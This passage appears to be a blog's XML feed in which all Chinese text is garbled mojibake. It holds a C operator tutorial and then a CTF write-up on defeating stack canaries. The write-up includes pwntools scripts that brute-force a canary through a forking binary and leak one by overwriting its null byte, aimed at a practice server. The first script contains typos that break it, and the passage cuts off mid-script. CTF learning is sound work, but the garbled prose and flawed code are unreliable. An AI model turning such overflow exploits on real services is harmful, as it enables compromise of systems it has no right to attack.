a;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="å››ã€èµ‹å€¼æ“ä½œç¬¦"><a href="#å››ã€èµ‹å€¼æ“ä½œç¬¦" class="headerlink" title="å››ã€èµ‹å€¼æ“ä½œç¬¦"></a>å››ã€èµ‹å€¼æ“ä½œç¬¦</h4><p>å…¶å®å°±æ˜¯å¯¹â€œ&#x3D;â€çš„è¿ç”¨ã€‚</p><pre><code class="plaintext">èµ‹å€¼æ“ä½œç¬¦å¯ä»¥è¿ç»­ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼šint a = 10;int x = 0;int y = 20;a = x = y+1;//è¿ç»­èµ‹å€¼</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><strong>å¤åˆèµ‹å€¼ç¬¦</strong></p><p>+&#x3D;</p><p>-&#x3D;</p><p>*&#x3D;</p><p>&#x2F;&#x3D;</p><p>%&#x3D;</p><p>&gt;&gt;&#x3D;</p><p>&lt;&lt;&#x3D;</p><p>&amp;&#x3D;</p><p>|&#x3D;</p><p>^&#x3D;</p><p>å¯ä»¥è‡ªå·±è¿›è¡Œå®è·µæ¢ç´¢å…·ä½“åŠŸèƒ½ğŸŒ¸</p><h4 id="äº”ã€å•ç›®æ“ä½œç¬¦"><a href="#äº”ã€å•ç›®æ“ä½œç¬¦" class="headerlink" title="äº”ã€å•ç›®æ“ä½œç¬¦"></a>äº”ã€å•ç›®æ“ä½œç¬¦</h4><pre><code class="plaintext">! é€»è¾‘åæ“ä½œ- è´Ÿå€¼+ æ­£å€¼&amp; å–åœ°å€sizeof æ“ä½œæ•°çš„ç±»å‹é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰~ å¯¹ä¸€ä¸ªæ•°çš„äºŒè¿›åˆ¶æŒ‰ä½å–å-- å‰ç½®ã€åç½®--++ å‰ç½®ã€åç½®++* é—´æ¥è®¿é—®æ“ä½œç¬¦(è§£å¼•ç”¨æ“ä½œç¬¦)(ç±»å‹) å¼ºåˆ¶ç±»å‹è½¬æ¢</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="å…­ã€å…³ç³»æ“ä½œç¬¦"><a href="#å…­ã€å…³ç³»æ“ä½œç¬¦" class="headerlink" title="å…­ã€å…³ç³»æ“ä½œç¬¦"></a>å…­ã€å…³ç³»æ“ä½œç¬¦</h4><pre><code class="plaintext">&gt;&gt;=&lt;&lt;=!= ç”¨äºæµ‹è¯•â€œä¸ç›¸ç­‰â€== ç”¨äºæµ‹è¯•â€œç›¸ç­‰â€</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ³¨æ„ï¼šç¼–ç¨‹è¿‡ç¨‹ä¸­ä¸è¦æ··æ·†&#x3D;&#x3D;å’Œ&#x3D;ï¼Œä¸ç„¶ä¼šå˜æˆbugå°å­ã€‚</p><h4 id="ä¸ƒã€é€»è¾‘æ“ä½œç¬¦"><a href="#ä¸ƒã€é€»è¾‘æ“ä½œç¬¦" class="headerlink" title="ä¸ƒã€é€»è¾‘æ“ä½œç¬¦"></a>ä¸ƒã€é€»è¾‘æ“ä½œç¬¦</h4><pre><code class="plaintext">&amp;&amp; é€»è¾‘ä¸|| é€»è¾‘æˆ–</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>åŒºåˆ†<strong>é€»è¾‘ä¸</strong>å’Œ<strong>æŒ‰ä½ä¸</strong></p><p>åŒºåˆ†<strong>é€»è¾‘æˆ–</strong>å’Œ<strong>æŒ‰ä½æˆ–</strong></p><pre><code class="plaintext">1&amp;2-----&gt;01&amp;&amp;2----&gt;11|2-----&gt;31||2----&gt;1</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="å…«ã€æ¡ä»¶æ“ä½œç¬¦"><a href="#å…«ã€æ¡ä»¶æ“ä½œç¬¦" class="headerlink" title="å…«ã€æ¡ä»¶æ“ä½œç¬¦"></a>å…«ã€æ¡ä»¶æ“ä½œç¬¦</h4><pre><code class="plaintext">exp1 ? exp2 : exp3</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ‡’é¬¼æ‡’å¾—è§£é‡Šäº†ç›´æ¥ä¸ŠğŸŒ°</p><p>ä¾‹ï¼š</p><pre><code class="plaintext">#include&lt;stdio.h&gt;int main()&#123;    int a, b;    scanf(&quot;%d%d&quot;, &amp;a, &amp;b);    int c = (a &gt; b) ? a : b;    printf(&quot;%d&quot;, c);    return 0;&#125;//è¾“å…¥5 3 ç»“æœä¸º5 è¾“å…¥3 5 ç»“æœä¸º3</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="ä¹ã€é€—å·è¡¨è¾¾å¼"><a href="#ä¹ã€é€—å·è¡¨è¾¾å¼" class="headerlink" title="ä¹ã€é€—å·è¡¨è¾¾å¼"></a>ä¹ã€é€—å·è¡¨è¾¾å¼</h4><pre><code class="plaintext">exp1, exp2, exp3, â€¦expN</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>é€—å·è¡¨è¾¾å¼ï¼Œå°±æ˜¯ç”¨é€—å·éš”å¼€çš„å¤šä¸ªè¡¨è¾¾å¼ã€‚</p><p>é€—å·è¡¨è¾¾å¼ï¼Œä»å·¦å‘å³ä¾æ¬¡æ‰§è¡Œã€‚æ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæ˜¯æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æœã€‚</p><h4 id="åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜"><a href="#åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜" class="headerlink" title="åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜"></a>åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜</h4><p>\1. [ ] ä¸‹æ ‡å¼•ç”¨æ“ä½œç¬¦</p><p>æ“ä½œæ•°ï¼šä¸€ä¸ªæ•°ç»„å + ä¸€ä¸ªç´¢å¼•å€¼</p><pre><code class="plaintext">int arr[6];//åˆ›å»ºæ•°ç»„arr[6] = 10;//å®ç”¨ä¸‹æ ‡å¼•ç”¨æ“ä½œç¬¦ã€‚[ ]çš„ä¸¤ä¸ªæ“ä½œæ•°æ˜¯arrå’Œ6</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>\2. ( ) å‡½æ•°è°ƒç”¨æ“ä½œç¬¦</p><p>æ¥å—ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ“ä½œæ•°ï¼šç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯å‡½æ•°åï¼Œå‰©ä½™çš„æ“ä½œæ•°å°±æ˜¯ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ã€‚</p><pre><code class="c">#include &lt;stdio.h&gt;void test1()&#123;printf(&quot;hehe\n&quot;);&#125;void test2(const char *str)&#123;printf(&quot;%s\n&quot;, str);&#125;int main()&#123;test1(); //å®ç”¨ï¼ˆï¼‰ä½œä¸ºå‡½æ•°è°ƒç”¨æ“ä½œç¬¦ã€‚test2(&quot;hello bit.&quot;);//å®ç”¨ï¼ˆï¼‰ä½œä¸ºå‡½æ•°è°ƒç”¨æ“ä½œç¬¦ã€‚return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>\3. è®¿é—®ä¸€ä¸ªç»“æ„çš„æˆå‘˜</p><table><thead><tr><th>. - &gt;</th><th>ç»“æ„ä½“.æˆå‘˜å ç»“æ„ä½“æŒ‡é’ˆ-&gt;æˆå‘˜å</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><pre><code class="c">#include&lt;stdio.h&gt;struct S&#123;    int num ;    char c ;&#125;;int main()&#123;    struct S s = &#123;6,&#39;a&#39;&#125;;    printf(&quot;%d\n&quot;, s.num);    printf(&quot;%c&quot;, s.c);&#125;//æ‰“å°å‡º6 a</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><pre><code class="c">#include&lt;stdio.h&gt;struct S&#123;    int num ;    char c ;&#125;;void test(struct S* p)&#123;    printf(&quot;%d\n&quot;, p-&gt;num);    printf(&quot;%c&quot;, p-&gt;c);&#125;int main()&#123;    struct S s = &#123;6,&#39;a&#39;&#125;;    test(&amp;s);    return 0;&#125;//æ‰“å°å‡º6 a</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><ol><li><h3 id="æ“ä½œç¬¦å±æ€§"><a href="#æ“ä½œç¬¦å±æ€§" class="headerlink" title="æ“ä½œç¬¦å±æ€§"></a>æ“ä½œç¬¦å±æ€§</h3></li></ol><p>*<strong>å¤æ‚è¡¨è¾¾å¼çš„æ±‚å€¼æœ‰ä¸‰ä¸ªå½±å“çš„å› ç´ ï¼š*</strong></p><p>\1. æ“ä½œç¬¦çš„ä¼˜å…ˆçº§</p><p>\2. æ“ä½œç¬¦çš„ç»“åˆæ€§</p><p>\3. æ˜¯å¦æ§åˆ¶æ±‚å€¼é¡ºåºã€‚</p><p>ğŸ’«<strong>ä¸¤ä¸ªç›¸é‚»çš„æ“ä½œç¬¦å…ˆæ‰§è¡Œå“ªä¸ªï¼Ÿå–å†³äºä»–ä»¬çš„ä¼˜å…ˆçº§ï¼›å¦‚æœä¸¤è€…çš„ä¼˜å…ˆçº§ç›¸åŒï¼Œå–å†³äºä»–ä»¬çš„ç»“åˆæ€§ã€‚</strong></p><ol><li><h3 id="æ“ä½œç¬¦çš„ä¼˜å…ˆçº§"><a href="#æ“ä½œç¬¦çš„ä¼˜å…ˆçº§" class="headerlink" title="æ“ä½œç¬¦çš„ä¼˜å…ˆçº§"></a>æ“ä½œç¬¦çš„ä¼˜å…ˆçº§</h3></li></ol><table><thead><tr><th>æ“ä½œ ç¬¦</th><th>æè¿°</th><th>ç”¨æ³•ç¤ºä¾‹</th><th>ç»“æœç±»å‹</th><th>ç»“åˆæ€§</th><th>æ˜¯å¦æ§åˆ¶æ±‚å€¼é¡ºåº</th></tr></thead><tbody><tr><td>ï¼ˆï¼‰</td><td>èšç»„</td><td>ï¼ˆè¡¨è¾¾å¼ï¼‰</td><td>ä¸è¡¨è¾¾ å¼åŒ</td><td>N&#x2F;Aï¼ˆä¸é€‚ç”¨ï¼‰</td><td>å¦</td></tr><tr><td>ï¼ˆï¼‰</td><td>å‡½æ•°è°ƒç”¨</td><td>rexpï¼ˆrexpï¼Œâ€¦,rexpï¼‰</td><td>rexp</td><td>L-Rï¼ˆå·¦åˆ°å³ï¼‰</td><td>å¦</td></tr><tr><td>[ ]</td><td>ä¸‹æ ‡å¼•ç”¨</td><td>rexp[rexp]</td><td>lexp</td><td>L-R</td><td>å¦</td></tr><tr><td>.</td><td>è®¿é—®ç»“æ„æˆå‘˜</td><td>lexp.member_name</td><td>lexp</td><td>L-R</td><td>å¦</td></tr><tr><td>-&gt;</td><td>è®¿é—®ç»“æ„æŒ‡é’ˆæˆå‘˜</td><td>rexp-&gt;member_name</td><td>lexp</td><td>L-R</td><td>å¦</td></tr><tr><td>++</td><td>åç¼€è‡ªå¢</td><td>lexp ++</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>â€“</td><td>åç¼€è‡ªå‡</td><td>lexp â€“</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>!</td><td>é€»è¾‘å</td><td>! rexp</td><td>rexp</td><td>R-Lï¼ˆå³åˆ°å·¦ï¼‰</td><td>å¦</td></tr><tr><td>~</td><td>æŒ‰ä½å–å</td><td>~ rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>+</td><td>å•ç›®ï¼Œè¡¨ç¤ºæ­£å€¼</td><td>+ rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>-</td><td>å•ç›®ï¼Œè¡¨ç¤ºè´Ÿå€¼</td><td>- rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>++</td><td>å‰ç¼€è‡ªå¢</td><td>++ lexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>â€“</td><td>å‰ç¼€è‡ªå‡</td><td>â€“ lexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>*</td><td>é—´æ¥è®¿é—®</td><td>* rexp</td><td>lexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&amp;</td><td>å–åœ°å€</td><td>&amp; lexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>sizeof</td><td>å–å…¶é•¿åº¦ï¼Œä»¥å­—èŠ‚ è¡¨ç¤º</td><td>sizeof rexp sizeof(ç±» å‹)</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>(ç±» å‹ï¼‰</td><td>ç±»å‹è½¬æ¢</td><td>(ç±»å‹) rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>*</td><td>ä¹˜æ³•</td><td>rexp * rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&#x2F;</td><td>é™¤æ³•</td><td>rexp &#x2F; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>%</td><td>æ•´æ•°å–ä½™</td><td>rexp % rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>+</td><td>åŠ æ³•</td><td>rexp + rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>-</td><td>å‡æ³•</td><td>rexp - rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&lt;&lt;</td><td>å·¦ç§»ä½</td><td>rexp &lt;&lt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&gt;&gt;</td><td>å³ç§»ä½</td><td>rexp &gt;&gt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&gt;</td><td>å¤§äº</td><td>rexp &gt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&gt;&#x3D;</td><td>å¤§äºç­‰äº</td><td>rexp &gt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&lt;</td><td>å°äº</td><td>rexp &lt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&lt;&#x3D;</td><td>å°äºç­‰äº</td><td>rexp &lt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&#x3D;&#x3D;</td><td>ç­‰äº</td><td>rexp &#x3D;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>!&#x3D;</td><td>ä¸ç­‰äº</td><td>rexp !&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&amp;</td><td>ä½ä¸</td><td>rexp &amp; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>^</td><td>ä½å¼‚æˆ–</td><td>rexp ^ rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>|</td><td>ä½æˆ–</td><td>rexp | rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&amp;&amp;</td><td>é€»è¾‘ä¸</td><td>rexp &amp;&amp; rexp</td><td>rexp</td><td>L-R</td><td>æ˜¯</td></tr><tr><td>||</td><td>é€»è¾‘æˆ–</td><td>rexp || rexp</td><td>rexp</td><td>L-R</td><td>æ˜¯</td></tr><tr><td>? :</td><td>æ¡ä»¶æ“ä½œç¬¦</td><td>rexp ? rexp : rexp</td><td>rexp</td><td>N&#x2F;A</td><td>æ˜¯</td></tr><tr><td>&#x3D;</td><td>èµ‹å€¼</td><td>lexp &#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>+&#x3D;</td><td>ä»¥â€¦åŠ </td><td>lexp +&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>-&#x3D;</td><td>ä»¥â€¦å‡</td><td>lexp -&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>*&#x3D;</td><td>ä»¥â€¦ä¹˜</td><td>lexp *&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&#x2F;&#x3D;</td><td>ä»¥â€¦é™¤</td><td>lexp &#x2F;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>%&#x3D;</td><td>ä»¥â€¦å–æ¨¡</td><td>lexp %&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&lt;&lt;&#x3D;</td><td>ä»¥â€¦å·¦ç§»</td><td>lexp &lt;&lt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&gt;&gt;&#x3D;</td><td>ä»¥â€¦å³ç§»</td><td>lexp &gt;&gt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&amp;&#x3D;</td><td>ä»¥â€¦ä¸</td><td>lexp &amp;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>^&#x3D;</td><td>ä»¥â€¦å¼‚æˆ–</td><td>lexp ^&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>|&#x3D;</td><td>ä»¥â€¦æˆ–</td><td>lexp |&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>ï¼Œ</td><td>é€—å·</td><td>rexpï¼Œrexp</td><td>rexp</td><td>L-R</td><td>æ˜¯</td></tr></tbody></table><p>ç®€å•è®°å°±æ˜¯:!&gt;ç®—æœ¯è¿ç®—ç¬¦&gt;å…³ç³»è¿ç®—ç¬¦ç¬¦&gt;&amp;&amp;&gt;||&gt;èµ‹å€¼è¿ç®—ç¬¦</p>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cè¯­è¨€,çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canaryè§£å†³å§¿åŠ¿</title>
      <link href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="Canaryè§£å†³å§¿åŠ¿"><a href="#Canaryè§£å†³å§¿åŠ¿" class="headerlink" title="Canaryè§£å†³å§¿åŠ¿"></a><strong>Canaryè§£å†³å§¿åŠ¿</strong></h2><p>è¢«æŠ˜ç£¨çš„æœ‰ç‚¹éš¾å— æ‰¾ä¸ªæ—¶é—´æ¥æ–©æ€ï¼ˆbushiï¼‰åˆæ˜¯è¢«è™çš„ä¸€å¤©~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p><hr><p><u>æœ‰é—®é¢˜è¯·æŒ‡æ­£~</u>â€<br><u>è·å–ä¾‹é¢˜è¯·åœ¨è¯„è®ºåŒºç•™è¨€æˆ–ç§ä¿¡æˆ‘</u>â­</p><h4 id="ä¸€ã€canaryçˆ†ç ´"><a href="#ä¸€ã€canaryçˆ†ç ´" class="headerlink" title="ä¸€ã€canaryçˆ†ç ´"></a><strong>ä¸€ã€canaryçˆ†ç ´</strong></h4><p>æ ‡å¿—æç¤ºå°±ç®—forkå‡½æ•°å§ å¤šçº¿ç¨‹å¼€æ”»</p><p><strong>ã€funcannaryã€‘</strong>*</p><p>ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ pedaé…å¥—checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™welcomeâ€™åœ¨çˆ†ç ´çš„expä¸­ä¼šç”¨ä½œäºè¦†ç›–èŠ‚ç‚¹</p><p>â€‹                              â€‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>â€‹         å‘ç°Canaryå’ŒPIEéƒ½å¼€ å‡†å¤‡å¥½çˆ†ç ´ï¼ˆå¦‚æœæœ‰å¯ä»¥åˆ©ç”¨çš„å­—ç¬¦ä¸²canaryä¹Ÿå¯ä»¥ç»•è¿‡ï¼‰<br>â€‹         å¯¹åº”éšæœºåŒ– åç»­åœ¨IDAä¸­åªèƒ½åˆ©ç”¨å…¶åœ°å€è®¡ç®—åç§»</p><p>ï¼ˆ2ï¼‰è¿›IDA </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>forkæ¥å£ &#x3D;&#x3D; canaryçˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>å‘ç°å‡½æ•°å…¥å£ä¸º0x122D å¹¶ä¸”å‘ç°â€&#x2F;bin&#x2F;cat flagâ€ æ¥ä¸‹æ¥æ‰¾æº¢å‡ºä½ç½®çˆ†ç ´cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>æ˜æ˜¾æº¢å‡º å®šä½è¯¥å‡½æ•°sub_128Aï¼ˆçˆ†ç ´canaryçš„ä½ç½®ï¼‰çˆ†ç ´æˆåŠŸåçˆ†è¿”å›åœ°å€ ï¼ˆçˆ†canaryåœ°å€çš„ä¸‹ä¸€ä½ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>å‡½æ•°å…¥å£ä¸º0x122D shellè¿”å›åœ°å€ä¸º1329 åç§»ä¸º0xfc(0x1329-0x122D) è¦†ç›–çš„bufå¤§å°ä¸º0x68</p><p><strong>tips</strong><br>ã€1ã€‘canaryå¤§å°ä¸º0x00-0xff æ‰€ä»¥çˆ†ç ´æ—¶æ¯å­—èŠ‚éœ€å¾ªç¯257æ¬¡ åˆå› ä¸ºcanaryä½ä¸‰ä½å®šä¸º\x00ï¼ˆ32ä½çˆ†ç ´å¾ªç¯3æ¬¡ 64ä½å¾ªç¯7æ¬¡ï¼‰æ­¤å¤„éœ€å¾ªç¯7æ¬¡<br>ã€2ã€‘ç¨‹åºå…¥å£ç‚¹ä¸€èˆ¬éƒ½æ˜¯æ•´æ•°ï¼Œå³åœ°å€æœ€ä½ä½ä¸º00ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„åœ°å€ï¼Œ0x29æ˜¯å¯ä¿¡çš„ã€‚å°±åªè¦çˆ†ç ´åä¸€ä½å°±OKï¼Œå†åé¢çš„åœ°å€éƒ½ç›¸åŒï¼Œçˆ†ä¸çˆ†éƒ½ä¸€æ ·ã€‚</p><p>expï¼š</p><pre><code class="python">from pwn import *   context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;context.log_level = &#39;debug&#39;p = process(&quot;./fun&quot;)#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)p.recvuntil(b&#39;welcome\n&#39;) canary = b&#39;\x00&#39;#canaryfor k in range(7):  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)  for i in range(256):     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))     recv = p.recvuntil(b&#39;welcome\n&#39;)     if b&quot;have fun&quot; in recv:      cannary += bytes([i])      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)      break      #return addressre_1 = 0x29re_2 = 0info(&#39;finding:re_2 ...&#39;)for re_i in range(0x100):  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)#p8()å°†ç»™å®šçš„æ•´æ•°è½¬æ¢ä¸ºå•å­—èŠ‚çš„å­—èŠ‚ä¸²  p.send(payload)  recv = p.recvuntil(b&quot;welcome\n&quot;)  if b&quot;have fun&quot; in recv:       re_2 = re_i       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)       breakpayload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1å¯¹é½æ ˆp.send(payload)p.interactive()</code></pre><h4 id="äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ-x00ï¼‰è·å–canary"><a href="#äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ-x00ï¼‰è·å–canary" class="headerlink" title="äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary"></a>äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary</h4><p>æ€è·¯ï¼š<br>$æ„é€ ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œè¦†ç›–canaryçš„ä½å­—èŠ‚\x00ï¼Œè¯»å‡ºcanaryçš„å€¼.<br>$æ„é€ ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œåˆ©ç”¨è·å–çš„canaryæ„é€ payloadï¼Œget shell.<br>ã€babypieã€‘<br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p><p>  ä¸¤æ¬¡readæº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png" alt="image-20230628171033720"></p><p>NXæ‰“å¼€æœ‰å¯åˆ©ç”¨çš„systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰<br>PIEæ‰“å¼€åä½åœ°å€å§‹ç»ˆä¸å˜ï¼Œå¯ä»¥ç¢°è¿æ°”ï¼ˆbuhsi(â—â€™â—¡â€™â—)ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p><p>canaryä»¥\x00ç»“å°¾ï¼ˆä¸ºé˜²æ­¢è¢«è¯»å‡ºï¼‰é‚£æˆ‘ä»¬å°±æº¢å‡ºè¦†ç›–\x00å†é€šè¿‡printå‡½æ•°æ‰“å°å‡ºcanary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p><p>0x30-0x8 &#x3D; 40ï¼Œå†+1è¦†ç›–\x00<br>expï¼š</p><pre><code class="python">from pwn import*#sh = process(&#39;./babypie&#39;)sh = remote(&#39;node4.buuoj.cn&#39;,29536)payload = b&#39;a&#39; * 0x29#å…ˆæ•´canarysh.sendafter(b&#39;Input your Name:\n&#39;,payload)sh.recv(6 + 40)#è¯»å–6ä¸ªå­—èŠ‚ï¼ˆå³ç¨‹åºçš„å›åº”æ¶ˆæ¯ï¼‰å’Œ40ä¸ªå­—èŠ‚ï¼ˆå³ç¨‹åºè¿”å›çš„canaryå€¼ï¼‰canary = u64(sh.recv(8)) &amp; 